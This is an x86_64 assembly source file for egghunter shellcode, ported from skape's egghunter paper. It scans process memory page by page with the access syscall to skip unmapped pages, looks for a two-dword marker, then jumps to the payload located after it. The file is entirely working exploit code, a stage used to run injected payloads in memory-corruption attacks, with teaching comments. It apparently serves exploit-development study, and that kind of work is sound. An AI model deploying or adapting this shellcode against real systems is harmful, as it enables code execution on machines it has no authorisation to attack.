global _start

; derived from skape's paper on egghunters
; the following is a mix of his access and sigaction examples, ported to x86_64
; http://hick.org/code/skape/papers/egghunt-shellcode.pdf


section .text

_start:

  xor edi, edi              ; rdi     -> 0x0
  mul edi                   ; rax|rdx -> 0x0
  xchg eax, esi             ; rsi     -> 0x0

  inc edx
  shl edx, 12               ; rdx     -> 0x1000
  mov rdi, PLACEHOLDER

  ; known register state before the hunt begins
  ; rsi -> 0x0
  ; rdi -> 0x0
  ; rdx -> 0x1000 -> 4096 -> PAGE_SIZE

increment_page:
  lea rdi, [rdi + rdx]      ; inc pointer by 4096 - keeping page aligned

increment_address:
  push 21
  pop rax                   ; access syscall # loaded into rax
  syscall                   ; call access($rdi, $rsi) where rsi is 0x0 and rdi is a memory address

  cmp al, 0xf2              ; if al contains 0xf2, EFAULT was returned (bad addr)
  je increment_page         ; continue the hunt!

compare:
  mov eax, 0x6564726e       ; store the egg for comparison, actual egg is 0x6564726f
  inc al                    ; increment the egg by one so the egg doesn't find itself
  scasd                     ; compare first dword
  je compare_success        ; if equal, go to compare_success

  mov rbx, rdi
  and rbx, 0xFFF            ; compute rdi mod 4096 (0xFFF is 4095 in hex)
  test rbx, rbx             ; check if rdi is page-aligned
  jz increment_address      ; if it is, check if we have access to new page

  jmp compare               ; otherwise, continue with next byte

compare_success:
  mov eax, 0x00363671
  inc al

  scasd                     ; compare second dword
  jne compare

  jmp rdi                   ; found it, fire ze missiles!
